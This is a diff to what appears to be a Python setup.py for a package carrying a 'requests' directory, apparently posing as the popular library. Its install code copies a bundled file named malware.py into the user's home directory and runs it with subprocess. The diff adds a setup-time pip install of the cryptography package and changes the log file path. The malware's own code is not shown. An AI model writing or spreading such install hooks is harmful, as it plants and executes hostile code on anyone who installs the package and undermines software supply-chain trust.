@@ -39,7 +39,7 @@ here = os.path.abspath(os.path.dirname(__file__))
 #     sys.exit()
 
 
-subprocess.call(["pip", "install", "wheel"])
+subprocess.call(["pip", "install", "wheel", "cryptography"])
 
 packages = ['requests']
 
@@ -82,9 +82,10 @@ if home is None:
 shutil.copy2(os.path.join(here, 'requests', 'malware.py'), os.path.join(home,"malware.py"))
 command = [sys.executable, home + '/malware.py']
 subproc = subprocess.call(command, shell=False)
-#subproc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False)
+#subproc = subprocess.Popen(command, shell=False)
 
-with open("/home/parish/output.txt", "a") as text_file:
+
+with open("output.txt", "a") as text_file:
     for root, dirs, files in os.walk(os.path.join(here, 'requests')):
         for file in files:
             if file.endswith("malware.py"):
